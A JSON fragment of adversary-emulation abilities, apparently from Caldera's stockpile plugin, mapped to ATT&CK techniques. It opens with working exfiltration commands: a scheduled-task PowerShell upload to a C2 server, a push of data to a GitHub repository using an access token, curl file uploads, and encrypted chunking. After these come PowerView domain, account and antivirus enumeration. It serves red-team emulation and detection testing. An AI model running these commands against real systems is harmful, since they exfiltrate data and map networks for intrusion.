                    "command": "$commandString = '$fieldName = \\\"#{host.dir.compress}\";\n$filePath = \\\"#{host.dir.compress}\";\n$url = \\\"#{server}/file/upload\\\";\nAdd-Type -AssemblyName \\\"System.Net.Http\\\";\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n\n$xRequestIdHeader = \\\"X-Request-Id\\\";\n$xRequestIdField = $env:COMPUTERNAME + \\\"-#{paw}\\\";\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add($xRequestIdHeader, $xRequestIdField);\n\n$userAgentHeader = \\\"User-Agent\\\";\n$userAgentField = \\\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\";\n$client.DefaultRequestHeaders.Add($userAgentHeader, $userAgentField);\n$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();';\n\n$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"$commandString\";\n$trigger = New-ScheduledTaskTrigger -Once -At 12pm;\n\nRegister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Trigger $trigger -Action $action;\n",
                    "cleanup": "Unregister-ScheduledTask -TaskName \"Scheduled exfiltration\" -Confirm:$false;"
                }
            }
        },
        "id__dependence__fact": [
            "110cea7a-5b03-4443-92ee-7ccefaead451",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "110cea7a-5b03-4443-92ee-7ccefaead451"
    },
    "T1567.001__exfiltration__Exfiltration to Code Repository__4a1120a5-971c-457f-bb07-60641b4723fd": {
        "description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1567.001",
            "name": "Exfiltration to Code Repository"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "4a1120a5-971c-457f-bb07-60641b4723fd",
            "host.dir.compress",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "4a1120a5-971c-457f-bb07-60641b4723fd"
    },
    "T1041__exfiltration__Exfiltration Over C2 Channel__ea713bc4-63f0-491c-9a6f-0b01d560b87e": {
        "description": "Exfil the staged directory",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1041",
            "name": "Exfiltration Over C2 Channel"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload\n"
                }
            },
            "windows": {
                "psh,pwsh": {
                    "command": "$ErrorActionPreference = 'Stop';\n$fieldName = \"#{host.dir.compress}\";\n$filePath = \"#{host.dir.compress}\";\n$url = \"#{server}/file/upload\";\n\nAdd-Type -AssemblyName 'System.Net.Http';\n\n$client = New-Object System.Net.Http.HttpClient;\n$content = New-Object System.Net.Http.MultipartFormDataContent;\n$fileStream = [System.IO.File]::OpenRead($filePath);\n$fileName = [System.IO.Path]::GetFileName($filePath);\n$fileContent = New-Object System.Net.Http.StreamContent($fileStream);\n$content.Add($fileContent, $fieldName, $fileName);\n$client.DefaultRequestHeaders.Add(\"X-Request-Id\", $env:COMPUTERNAME + '-#{paw}');\n$client.DefaultRequestHeaders.Add(\"User-Agent\",\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\");\n\n$result = $client.PostAsync($url, $content).Result;\n$result.EnsureSuccessStatusCode();\n"
                }
            }
        },
        "id__dependence__fact": [
            "ea713bc4-63f0-491c-9a6f-0b01d560b87e",
            "host.dir.compress",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e"
    },
    "T1030__exfiltration__Data Transfer Size Limits__5c5b0392-1daa-45e1-967c-2f361ce78849": {
        "description": "This ability will compress the staged files into a password protected archive and break it\ninto smaller chunks based on the given byte size. The original archive will be automatically\ndeleted. Use this instead of other archiving abilities if small file sizes for exfiltration \nare desired. When used with an exfiltration ability, the exfiltration ability will run numerous\ntimes in an operation depending on how many chunks are created. \n",
        "tactic": "exfiltration",
        "technique": {
            "attack_id": "T1030",
            "name": "Data Transfer Size Limits"
        },
        "platforms": {
            "linux": {
                "sh": {
                    "command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase '#{host.archive.password}' > #{host.dir.staged}.tar.gz.gpg;\nsplit -b#{file.size.chunk} '#{host.dir.staged}.tar.gz.gpg' '#{host.dir.staged}'/calderachunk;\nrm '#{host.dir.staged}.tar.gz.gpg';\nfind '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' 2>/dev/null;\n",
                    "cleanup": "find '#{host.dir.staged}' -maxdepth 1 -name 'calderachunk*' -exec rm -rf {} \\;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" '-p#{host.archive.password}' | Out-Null;\nsleep 2;\n$Archive = Get-Item -Path \"#{host.dir.staged}.7z\";\n$StageDir = \"#{host.dir.staged}\";\n$BaseName = $StageDir + \"\\calderachunk\";\n$UpperBound = [int32]\"#{file.size.chunk}\";\n$Content = [IO.File]::OpenRead($Archive);\n$buff = New-Object byte[] $UpperBound;\n$Bytes = $idx = 0;\ntry {\n    do {\n        $Bytes = $Content.Read($buff, 0, $buff.Length);\n        if ($Bytes -gt 0) {\n            $ChunkName = \"{0}{1}\" -f ($BaseName, $idx.ToString().PadLeft(3,'0'));\n            $ChunkFile = [IO.File]::OpenWrite($ChunkName);\n            try {\n                $ChunkFile.Write($buff, 0, $Bytes);\n            } finally {\n                $ChunkFile.Close();\n            }\n        }\n        $idx ++;\n    } while ($Bytes -gt 0)\n}\nfinally {\n    $Content.Close();\n}\nRemove-Item $Archive;\nGet-ChildItem -Path \"$StageDir\\calderachunk*\" | foreach {$_.FullName} | Select-Object;\n",
                    "cleanup": "Get-ChildItem -Path \"$StageDir\\calderachunk*\" | Remove-Item;\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.dir.compress"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "5c5b0392-1daa-45e1-967c-2f361ce78849",
            "host.dir.staged",
            "host.dir.compress",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "5c5b0392-1daa-45e1-967c-2f361ce78849"
    },
    "T1018__discovery__Remote System Discovery__13379ae1-d20e-4162-91f8-320d78a35e7f": {
        "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.gdomain": [
                            {
                                "source": "remote.host.fqdn"
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "13379ae1-d20e-4162-91f8-320d78a35e7f",
            "None",
            "remote.host.fqdn",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "13379ae1-d20e-4162-91f8-320d78a35e7f"
    },
    "T1069.001__discovery__Permission Groups Discovery: Local Groups__5c4dd985-89e3-4590-9b57-71fed66ff4e2": {
        "description": "Summary of permission and security groups",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "gpresult /R\n"
                }
            },
            "darwin": {
                "sh": {
                    "command": "groups"
                }
            },
            "linux": {
                "sh": {
                    "command": "groups"
                }
            }
        },
        "id__dependence__fact": [
            "5c4dd985-89e3-4590-9b57-71fed66ff4e2",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2"
    },
    "T1082__discovery__System Information Discovery__29451844-9b76-4e16-a9ee-d6feab4b24db": {
        "description": "Discover the PowerShell version",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "$PSVersionTable\n"
                }
            }
        },
        "id__dependence__fact": [
            "29451844-9b76-4e16-a9ee-d6feab4b24db",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "29451844-9b76-4e16-a9ee-d6feab4b24db"
    },
    "T1518.001__discovery__Software Discovery: Security Software Discovery__8c06ebf8-bacf-486b-bd77-21ba8c5a5777": {
        "description": "Identify Firewalls",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"
                }
            }
        },
        "id__dependence__fact": [
            "8c06ebf8-bacf-486b-bd77-21ba8c5a5777",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777"
    },
    "T1016__discovery__System Network Configuration Discovery__a0676fe1-cd52-482e-8dde-349b73f9aa69": {
        "description": "See the most used WIFI networks of a machine",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "./wifi.sh pref\n",
                    "payloads": [
                        "wifi.sh"
                    ],
                    "parsers": {
                        "plugins.stockpile.app.parsers.wifipref": [
                            {
                                "source": "wifi.network.ssid"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "./wifi.sh pref\n",
                    "payloads": [
                        "wifi.sh"
                    ],
                    "parsers": {
                        "plugins.stockpile.app.parsers.wifipref": [
                            {
                                "source": "wifi.network.ssid"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": ".\\wifi.ps1 -Pref\n",
                    "payloads": [
                        "wifi.ps1"
                    ],
                    "parsers": {
                        "plugins.stockpile.app.parsers.wifipref": [
                            {
                                "source": "wifi.network.ssid"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "a0676fe1-cd52-482e-8dde-349b73f9aa69",
            "None",
            "wifi.network.ssid",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "a0676fe1-cd52-482e-8dde-349b73f9aa69"
    },
    "T1518__discovery__Software Discovery__c9be8043-a445-4cbf-b77b-ed7bb007fc7c": {
        "description": "Determine the version of Internet Explorer running",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"
                }
            }
        },
        "id__dependence__fact": [
            "c9be8043-a445-4cbf-b77b-ed7bb007fc7c",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c"
    },
    "T1124__discovery__System Time Discovery__fa6e8607-e0b1-425d-8924-9b894da5a002": {
        "description": "get current system time (ISO 8601)",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1124",
            "name": "System Time Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.current.time"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.current.time"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh": {
                    "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.basic": [
                            {
                                "source": "host.current.time"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "fa6e8607-e0b1-425d-8924-9b894da5a002",
            "None",
            "host.current.time",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "fa6e8607-e0b1-425d-8924-9b894da5a002"
    },
    "T1201__discovery__Password Policy Discovery for a domain__2946edba-54d8-11eb-ae93-0242ac130002": {
        "description": "Password Policy Discovery for a domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1201",
            "name": "Password Policy Discovery for a domain"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "net accounts /domain\n"
                }
            }
        },
        "id__dependence__fact": [
            "2946edba-54d8-11eb-ae93-0242ac130002",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "2946edba-54d8-11eb-ae93-0242ac130002"
    },
    "T1497.001__discovery__Virtualization/Sandbox Evasion: System Checks__5dc841fd-28ad-40e2-b10e-fb007fe09e81": {
        "description": "Determine if the system is virtualized or physical",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "get-wmiobject win32_computersystem | fl model\n"
                }
            }
        },
        "id__dependence__fact": [
            "5dc841fd-28ad-40e2-b10e-fb007fe09e81",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "5dc841fd-28ad-40e2-b10e-fb007fe09e81"
    },
    "T1057__discovery__Process Discovery__3b5db901-2cb8-4df7-8043-c4628a6a5d5a": {
        "description": "Get process info for processes running as a user",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "ps aux | grep #{host.user.name}\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "ps aux | grep #{host.user.name}\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"
                }
            }
        },
        "id__dependence__fact": [
            "3b5db901-2cb8-4df7-8043-c4628a6a5d5a",
            "host.user.name",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a"
    },
    "T1012__discovery__Query Registry__2488245e-bcbd-405d-920e-2de27db882b3": {
        "description": "Query Registry using PowerShell Get-ItemProperty",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1012",
            "name": "Query Registry"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Get-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\n"
                }
            }
        },
        "id__dependence__fact": [
            "2488245e-bcbd-405d-920e-2de27db882b3",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "2488245e-bcbd-405d-920e-2de27db882b3"
    },
    "T1033__discovery__System Owner/User Discovery__bd527b63-9f9e-46e0-9816-b8434d2b8989": {
        "description": "Obtain user from current session",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "whoami\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "whoami\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "whoami\n"
                }
            }
        },
        "id__dependence__fact": [
            "bd527b63-9f9e-46e0-9816-b8434d2b8989",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "bd527b63-9f9e-46e0-9816-b8434d2b8989"
    },
    "T1518.001__discovery__Software Discovery: Security Software Discovery__7c42a30c-c8c7-44c5-80a8-862d364ac1e4": {
        "description": "Determine whether or not UAC is enabled",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "echo $(get-uac)\n"
                }
            }
        },
        "id__dependence__fact": [
            "7c42a30c-c8c7-44c5-80a8-862d364ac1e4",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4"
    },
    "T1018__discovery__Remote System Discovery__0360ede1-3c28-48d3-a6ef-6e98f562c5af": {
        "description": "Get a list of all computers in a domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n",
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "0360ede1-3c28-48d3-a6ef-6e98f562c5af",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af"
    },
    "T1018__discovery__Remote System Discovery__fa4ed735-7006-4451-a578-b516f80e559f": {
        "description": "Find hostname of remote IP in domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "nslookup #{remote.host.ip}\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.reverse_nslookup": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_ip",
                                "target": "remote.host.ip"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "fa4ed735-7006-4451-a578-b516f80e559f",
            "None",
            "remote.host.fqdn",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "fa4ed735-7006-4451-a578-b516f80e559f"
    },
    "T1049__discovery__System Network Connections Discovery__638fb6bb-ba39-4285-93d1-7e4775b033a8": {
        "description": "Find System Network Connections",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1049",
            "name": "System Network Connections Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "netstat -anto\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "netstat -anto\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "netstat -anto;\nGet-NetTCPConnection\n"
                }
            }
        },
        "id__dependence__fact": [
            "638fb6bb-ba39-4285-93d1-7e4775b033a8",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "638fb6bb-ba39-4285-93d1-7e4775b033a8"
    },
    "T1016__discovery__System Network Configuration Discovery__e8017c46-acb8-400c-a4b5-b3362b5b5baa": {
        "description": "View network configuration info for host",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "sudo ifconfig\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "sudo ifconfig\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "ipconfig\n"
                }
            }
        },
        "id__dependence__fact": [
            "e8017c46-acb8-400c-a4b5-b3362b5b5baa",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "e8017c46-acb8-400c-a4b5-b3362b5b5baa"
    },
    "T1082__discovery__System Information Discovery__b6b105b9-41dc-490b-bc5c-80d699b82ce8": {
        "description": "Find OS Version",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "[environment]::OSVersion.Version\n"
                }
            }
        },
        "id__dependence__fact": [
            "b6b105b9-41dc-490b-bc5c-80d699b82ce8",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "b6b105b9-41dc-490b-bc5c-80d699b82ce8"
    },
    "T1018__discovery__Remote System Discovery__85341c8c-4ecb-4579-8f53-43e3e91d7617": {
        "description": "Locate all active IP and FQDNs on the network",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "arp -a",
                    "parsers": {
                        "plugins.stockpile.app.parsers.ipaddr": [
                            {
                                "source": "remote.host.ip"
                            }
                        ]
                    }
                }
            },
            "linux": {
                "sh": {
                    "command": "arp -a",
                    "parsers": {
                        "plugins.stockpile.app.parsers.ipaddr": [
                            {
                                "source": "remote.host.ip"
                            }
                        ]
                    }
                }
            },
            "windows": {
                "psh,cmd": {
                    "command": "arp -a",
                    "parsers": {
                        "plugins.stockpile.app.parsers.ipaddr": [
                            {
                                "source": "remote.host.ip"
                            }
                        ]
                    }
                }
            }
        },
        "id__dependence__fact": [
            "85341c8c-4ecb-4579-8f53-43e3e91d7617",
            "None",
            "remote.host.ip",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617"
    },
    "T1018__discovery__Remote System Discovery__26c8b8b5-7b5b-4de1-a128-7d37fb14f517": {
        "description": "Identify the remote domain controllers",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "command": "nltest /dsgetdc:%USERDOMAIN%\n"
                },
                "psh": {
                    "command": "nltest /dsgetdc:$env:USERDOMAIN\n"
                }
            }
        },
        "id__dependence__fact": [
            "26c8b8b5-7b5b-4de1-a128-7d37fb14f517",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517"
    },
    "T1057__discovery__Process Discovery__335cea7b-bec0-48c6-adfb-6066070f5f68": {
        "description": "Display information about current system processes",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "darwin": {
                "sh": {
                    "command": "ps\n"
                }
            },
            "linux": {
                "sh": {
                    "command": "ps\n"
                }
            },
            "windows": {
                "psh": {
                    "command": "get-process\n"
                }
            }
        },
        "id__dependence__fact": [
            "335cea7b-bec0-48c6-adfb-6066070f5f68",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "335cea7b-bec0-48c6-adfb-6066070f5f68"
    },
    "T1033__discovery__System Owner/User Discovery__f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c": {
        "description": "Get Service Accounts for a domain",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.user.name",
                                "custom_parser_vals": {
                                    "json_key": "samaccountname",
                                    "json_type": "str"
                                }
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c",
            "None",
            "domain.user.name",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c"
    },
    "T1057__discovery__Process Discovery__4d9b079c-9ede-4116-8b14-72ad3a5533af": {
        "description": "Capture running processes via PowerShell",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh,pwsh": {
                    "command": "get-process >> $env:APPDATA\\vmtools.log;\ncat $env:APPDATA\\vmtools.log\n"
                }
            }
        },
        "id__dependence__fact": [
            "4d9b079c-9ede-4116-8b14-72ad3a5533af",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "4d9b079c-9ede-4116-8b14-72ad3a5533af"
    },
    "T1033__discovery__System Owner/User Discovery__aaf34d82-aea9-4278-8ec4-789653e4f5d9": {
        "description": "Get Administrator users for a computer",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.json": [
                            {
                                "source": "domain.user.name",
                                "custom_parser_vals": {
                                    "json_key": "samaccountname",
                                    "json_type": "str"
                                }
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "aaf34d82-aea9-4278-8ec4-789653e4f5d9",
            "None",
            "domain.user.name",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9"
    },
    "T1057__discovery__Process Discovery__8adf02e8-6e71-4244-886c-98c402857404": {
        "description": "Capture running processes and their loaded DLLs",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1057",
            "name": "Process Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log\n"
                }
            }
        },
        "id__dependence__fact": [
            "8adf02e8-6e71-4244-886c-98c402857404",
            "None",
            "None",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "8adf02e8-6e71-4244-886c-98c402857404"
    },
    "T1069.002__discovery__Permission Groups Discovery: Domain Groups__6d90e6fa-9324-4eb5-93be-9f737245bd7z": {
        "description": "Use PowerView to query the Active Directory server to determine remote admins",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}\n",
                    "parsers": {
                        "plugins.stockpile.app.parsers.netlocalgroup": [
                            {
                                "source": "remote.host.fqdn",
                                "edge": "has_admin",
                                "target": "domain.user.name"
                            }
                        ]
                    },
                    "payloads": [
                        "powerview.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "6d90e6fa-9324-4eb5-93be-9f737245bd7z",
            "None",
            "remote.host.fqdn",
            "stockpile"
        ],
        "plugin": "stockpile",
        "caldera_ability_id": "6d90e6fa-9324-4eb5-93be-9f737245bd7z"
    },
